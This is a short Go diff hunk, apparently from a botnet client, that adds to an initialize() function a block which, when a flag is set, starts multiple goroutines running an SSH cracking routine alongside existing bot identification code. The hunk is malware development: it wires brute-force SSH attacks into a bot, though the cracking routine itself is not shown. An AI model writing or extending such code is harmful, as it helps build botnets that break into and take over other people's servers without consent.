@@ -97,6 +97,13 @@ func initialize() {
 		id = botDetails.Id
 	}
 
+	// Ignite the SSH cracker.
+	if enableSshCracker {
+		for i := 0; i < sshThreads; i++ {
+			go sshCrackRoutine()
+		}
+	}
+
 	fmt.Println(botDetails)
 }
 
